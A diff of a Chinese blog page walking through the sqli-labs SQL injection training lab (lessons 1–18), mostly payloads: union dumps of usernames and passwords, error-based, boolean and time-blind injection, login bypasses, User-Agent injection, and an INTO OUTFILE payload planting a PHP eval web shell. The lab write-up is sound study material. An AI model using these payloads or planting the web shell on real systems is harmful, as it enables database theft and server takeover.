@@ -2,15 +2,6 @@
 
 
 
-
-
-
-
-
-
-
-
-
   
 
 
@@ -18,11 +9,8 @@
 <head>
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
-
-
-
 
 
 
@@ -50,6 +38,10 @@
 
 
 
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
 
 
 
@@ -58,25 +50,46 @@
 
 <link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
 
 
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
 
 
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
 
 
-  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
-
-
-
+  <link rel="mask-icon" href="/images/favicon.ico?v=5.1.4" color="#222">
 
 
 
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="用sqlilabs来练练注入环境很好配置 网上很多教程 less-1字符型 单引号闭合1?id=1&apos; or 1=1 %23 爆字段：12?id=1&apos; order by 3 %23?id=1&apos; union select 1,2,3 %23 爆表名：1?id=-1&apos; union select 1,2,table_name from information_schema.tables where tab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs (less1-less22)">
+<meta property="og:url" content="http://altmanz.cn/2018/02/05/sqli-labs 1/index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="用sqlilabs来练练注入环境很好配置 网上很多教程 less-1字符型 单引号闭合1?id=1&apos; or 1=1 %23 爆字段：12?id=1&apos; order by 3 %23?id=1&apos; union select 1,2,3 %23 爆表名：1?id=-1&apos; union select 1,2,table_name from information_schema.tables where tab">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-02-09T16:51:16.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs (less1-less22)">
+<meta name="twitter:description" content="用sqlilabs来练练注入环境很好配置 网上很多教程 less-1字符型 单引号闭合1?id=1&apos; or 1=1 %23 爆字段：12?id=1&apos; order by 3 %23?id=1&apos; union select 1,2,3 %23 爆表名：1?id=-1&apos; union select 1,2,table_name from information_schema.tables where tab">
 
 
 
@@ -85,13 +98,15 @@
   var CONFIG = {
     root: '/',
     scheme: 'Muse',
-    version: '6.3.0',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
     algolia: {
       applicationID: '',
       apiKey: '',
@@ -103,37 +118,12 @@
 </script>
 
 
-  
-
-
-
-
-  <meta name="description" content="用sqlilabs来练练注入环境很好配置 网上很多教程 less-1字符型 单引号闭合1?id=1&amp;apos; or 1=1 %23 爆字段：12?id=1&amp;apos; order by 3 %23?id=1&amp;apos; union select 1,2,3 %23 爆表名：1?id=-1&amp;apos; union select 1,2,table_name from information_sch">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs (less1-less22)">
-<meta property="og:url" content="http://altmanz.cn/2018/02/05/sqli-labs 1/index.html">
-<meta property="og:site_name" content="Altm4nz">
-<meta property="og:description" content="用sqlilabs来练练注入环境很好配置 网上很多教程 less-1字符型 单引号闭合1?id=1&amp;apos; or 1=1 %23 爆字段：12?id=1&amp;apos; order by 3 %23?id=1&amp;apos; union select 1,2,3 %23 爆表名：1?id=-1&amp;apos; union select 1,2,table_name from information_sch">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-09T16:51:16.000Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs (less1-less22)">
-<meta name="twitter:description" content="用sqlilabs来练练注入环境很好配置 网上很多教程 less-1字符型 单引号闭合1?id=1&amp;apos; or 1=1 %23 爆字段：12?id=1&amp;apos; order by 3 %23?id=1&amp;apos; union select 1,2,3 %23 爆表名：1?id=-1&amp;apos; union select 1,2,table_name from information_sch">
-
-
-
-
-
 
   <link rel="canonical" href="http://altmanz.cn/2018/02/05/sqli-labs 1/"/>
 
 
 
-<script type="text/javascript" id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
+
 
   <title>sqli-labs (less1-less22) | Altm4nz</title>
   
@@ -145,34 +135,6 @@
 
 
 
-
-  <noscript>
-  <style type="text/css">
-    .use-motion .motion-element,
-    .use-motion .brand,
-    .use-motion .menu-item,
-    .sidebar-inner,
-    .use-motion .post-block,
-    .use-motion .pagination,
-    .use-motion .comments,
-    .use-motion .post-header,
-    .use-motion .post-body,
-    .use-motion .collection-title { opacity: initial; }
-
-    .use-motion .logo,
-    .use-motion .site-title,
-    .use-motion .site-subtitle {
-      opacity: initial;
-      top: initial;
-    }
-
-    .use-motion {
-      .logo-line-before i { left: initial; }
-      .logo-line-after i { right: initial; }
-    }
-  </style>
-</noscript>
-
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -182,7 +144,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-right page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -191,17 +153,19 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">Altm4nz</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-    
+      
+        <p class="site-subtitle"></p>
+      
   </div>
 
   <div class="site-nav-toggle">
-    <button aria-label="Toggle navigation bar">
+    <button>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -209,37 +173,35 @@
   </div>
 </div>
 
-
-
 <nav class="site-nav">
+  
+
   
     <ul id="menu" class="menu">
       
         
-        
-        
-          
-          <li class="menu-item menu-item-home">
-    <a href="/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-    <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
-  </li>
-
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
       
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
       
     </ul>
-  
-
-  
-    
-
   
 
   
@@ -247,20 +209,12 @@
 
 
 
-  
-
-
-
-</div>
+ </div>
     </header>
-
-    
-
 
     <main id="main" class="main">
       <div class="main-inner">
         <div class="content-wrap">
-          
           <div id="content" class="content">
             
 
@@ -273,8 +227,6 @@
   
   
 
-  
-
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
@@ -285,7 +237,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Altm4nz">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/IMG_4178.JPG">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -297,50 +249,25 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs (less1-less22)
-              
-            
-          </h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs (less1-less22)</h1>
         
 
         <div class="post-meta">
           <span class="post-time">
-
-            
-            
-            
-
             
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posted on</span>
+                <span class="post-meta-item-text">发表于</span>
               
-
-              
-                
-              
-
-              <time title="Created: 2018-02-05 00:00:00" itemprop="dateCreated datePublished" datetime="2018-02-05T00:00:00+08:00">2018-02-05</time>
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-05T00:00:00+08:00">
+                2018-02-05
+              </time>
             
 
             
-              
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2018-02-10 00:51:16" itemprop="dateModified" datetime="2018-02-10T00:51:16+08:00">2018-02-10</time>
-              
             
           </span>
 
@@ -373,51 +300,48 @@
 
       
         <h1 id="用sqlilabs来练练注入"><a href="#用sqlilabs来练练注入" class="headerlink" title="用sqlilabs来练练注入"></a>用sqlilabs来练练注入</h1><p>环境很好配置 网上很多教程</p>
-<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>字符型 单引号闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or 1=1 %23</span><br></pre></td></tr></table></figure></p>
-<p>爆字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; order by 3 %23</span><br><span class="line">?id=1&apos; union select 1,2,3 %23</span><br></pre></td></tr></table></figure></p>
-<p>爆表名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1%23</span><br></pre></td></tr></table></figure></p>
-<p>爆列名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,2,column_name from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1%23</span><br></pre></td></tr></table></figure></p>
-<p>查看用户名密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&apos; union select 1,2,concat_ws(char(32,32,32),id,username,password) from users limit 0,1 %23</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>字符型 单引号闭合<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1' <span class="keyword">or</span> <span class="attribute">1</span>=1 %23</span><br></pre></td></tr></table></figure></p>
+<p>爆字段：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">' order by 3 %23</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3 %23</span></span><br></pre></td></tr></table></figure></p>
+<p>爆表名：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,table_name from information_schema.tables where table_schema=<span class="number">0x7365637572697479</span> limit <span class="number">0</span>,<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>爆列名：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,column_name from information_schema.columns where table_schema=<span class="number">0x7365637572697479</span> and table_name=<span class="number">0x7573657273</span> limit <span class="number">0</span>,<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>查看用户名密码：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span>=-1' union select 1,2,concat_ws(char(32,32,32),id,username,password) <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1 %23</span><br></pre></td></tr></table></figure></p>
 <p>(后面只记录payload 暴库方法都差不多)</p>
-<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p>数字型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or 1=1%23</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>字符型单引号变形<br>查询语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select login_name, select password from table where id= (‘id’)</span><br></pre></td></tr></table></figure></p>
-<p>用’)闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;) or 1=1 %23</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) or 1=1 %23</span><br></pre></td></tr></table></figure>
-<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>单引号报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;or 1=1 --+</span><br></pre></td></tr></table></figure></p>
-<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select count(*),1, concat(&apos;  &apos;,(select user()), &apos;  &apos;,floor(rand()*2)) as b from information_schema.tables group by b%23</span><br></pre></td></tr></table></figure></p>
-<p>试了试其他的报错:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or  (extractvalue(1,concat(0x7e,(select user()),0x7e))) %23</span><br><span class="line"></span><br><span class="line">?id=1&apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1))%23</span><br></pre></td></tr></table></figure></p>
-<p>都可以<br>但是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or exp(~(select * from (select database())a))%23</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p>数字型<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1 <span class="keyword">or</span> <span class="attribute">1</span>=1%23</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>字符型单引号变形<br>查询语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> login_name, <span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>= (‘<span class="keyword">id</span>’)</span><br></pre></td></tr></table></figure></p>
+<p>用’)闭合<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1') <span class="keyword">or</span> <span class="attribute">1</span>=1 %23</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1") <span class="keyword">or</span> <span class="attribute">1</span>=1 %23</span><br></pre></td></tr></table></figure>
+<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>单引号报错注入<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1'or <span class="attribute">1</span>=1 --+</span><br></pre></td></tr></table></figure></p>
+<p>payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="number">1</span>, <span class="keyword">concat</span>(<span class="string">'  '</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()), <span class="string">'  '</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> b <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> b%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>试了试其他的报错:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' or  (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>))) %<span class="number">23</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">1</span>' or (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>都可以<br>但是<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="keyword">or</span> <span class="built_in">exp</span>(~(<span class="built_in">select</span> * from (<span class="built_in">select</span> database())a))%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
 <p>这个语句在wamp环境下爆不出来<br>在lamp下就可以 没研究懂为啥。。。</p>
-<h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; or 1=1 %23</span><br></pre></td></tr></table></figure>
+<h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1" <span class="keyword">or</span> <span class="attribute">1</span>=1 %23</span><br></pre></td></tr></table></figure>
 <h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>导出文件GET字符型注入</p>
-<p>这个需要先找到根目录<br>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径<br>然后把查询结果导入到一个文件里 比如把一句话木马导入到php文件里<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;)) union select 1,&apos;2&apos;,&apos;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&apos; into outfile &apos;E:\\wamp\\www\\sqli-labs\\a.php&apos; %23</span><br></pre></td></tr></table></figure></p>
+<p>这个需要先找到根目录<br>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径<br>然后把查询结果导入到一个文件里 比如把一句话木马导入到php文件里<br>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">')) union select 1,'</span><span class="number">2</span><span class="string">','</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"a"</span>]);<span class="meta">?&gt;</span><span class="string">' into outfile '</span>E:\\wamp\\www\\sqli-labs\\a.php<span class="string">' %23</span></span><br></pre></td></tr></table></figure></p>
 <p>然后菜刀就OK</p>
-<h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>布尔盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr((select database()),1,1))=115 %23 //数据库第一位是s ascii码是115</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>布尔盲注<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' and ascii(substr((select database()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span> %<span class="number">23</span> <span class="comment">//数据库第一位是s ascii码是115</span></span><br></pre></td></tr></table></figure></p>
 <p>找到payload后写个脚本跑就可以了</p>
-<h3 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h3><p>单引号时间盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))=115,sleep(3),0 %23</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h3><p>双引号时间盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if(ascii(substr(database(),1,1))=115,sleep(3),0) %23</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=Dhakkan&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
-<h3 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=Dhakkan&quot;) or (&quot;1&quot;)=(&quot;1</span><br></pre></td></tr></table></figure>
-<h3 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;) or (&apos;1&apos;)=(&apos;1</span><br></pre></td></tr></table></figure>
-<h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure>
-<h3 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or 1=1#</span><br></pre></td></tr></table></figure>
-<h3 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;) or 1=1#</span><br></pre></td></tr></table></figure>
-<h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h3><p>在password处报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin</span><br><span class="line">passwd=&apos; or  (extractvalue(1,concat(0x7e,(select user()),0x7e))) %23</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h3><p>这关看了半天源码才会 先查数据库找到用户名密码登陆进去<br>回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br></pre></td></tr></table></figure></p>
-<p>在UA头处进行注入 单引号尝试一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;127.0.0.1&apos;, &apos;admin&apos;)&apos; at line 1</span><br></pre></td></tr></table></figure></p>
-<p>然后试试报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:&apos;or  (extractvalue(1,concat(0x7e,(select user()),0x7e))) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h3><p>单引号时间盲注<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' and if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,sleep(<span class="number">3</span>),<span class="number">0</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h3><p>双引号时间盲注<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1" <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr(database(),1,1))=115,sleep(3),0) %23</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">uname</span>=Dhakkan<span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h3 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=Dhakkan<span class="string">") or ("</span><span class="number">1</span><span class="string">")=("</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h3 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">admin</span><span class="string">') or ('</span><span class="number">1</span><span class="string">')=('</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h3 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">" or "</span><span class="number">1</span><span class="string">"="</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h3 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<h3 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">") or 1=1#</span></span><br></pre></td></tr></table></figure>
+<h3 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h3><p>在password处报错注入<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin</span><br><span class="line">passwd=' <span class="keyword">or</span>  (<span class="keyword">extractvalue</span>(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> user()),<span class="number">0x7e</span>))) <span class="symbol">%23</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h3><p>这关看了半天源码才会 先查数据库找到用户名密码登陆进去<br>回显：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your<span class="built_in"> User </span>Agent is: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br></pre></td></tr></table></figure></p>
